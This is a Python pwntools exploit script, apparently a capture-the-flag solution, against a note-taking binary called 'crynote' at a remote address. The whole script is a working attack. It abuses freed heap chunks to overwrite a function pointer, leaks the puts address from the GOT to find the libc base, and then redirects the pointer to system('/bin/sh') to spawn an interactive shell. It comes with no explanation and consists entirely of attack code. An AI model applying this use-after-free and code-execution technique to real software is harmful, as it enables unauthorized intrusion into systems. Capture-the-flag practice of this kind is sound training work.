#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './crynote'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '34.101.126.116', 21337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def create(size, data, key):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'size:', str(size).encode())
    io.sendafter(b'data:', data)
    io.sendafter(b'key:', key)

def delete(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'index:', str(idx).encode())

def encrypt(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'index:', str(idx).encode())

def exploit():
    global io
    io = initialize()
    
    create(0x10, b'AAAA\n', b'BBBB\n') # 0
    create(0x20, b'AAAA\n', b'BBBB\n') # 1
    delete(0)
    delete(1)

    payload = flat([elf.plt['puts'], elf.got['puts'], 0xdeadbeef])
    create(0x10, payload, b'LEAK\n') # 2

    encrypt(0)
    io.recvuntil(b'hex): ')
    leak = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    delete(2) # restoring heap bin state to the beginning of exploit

    create(0x10, b'FFFF\n', b'EEEE\n') # 3
    create(0x20, b'FFFF\n', b'EEEE\n') # 4
    delete(3)
    delete(4)

    payload = flat([libc.symbols['system'], next(libc.search(b'/bin/sh\x00')),  0xdeadbeef])
    create(0x10, payload, b'FINAL\n') # 5
    encrypt(3)

    info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()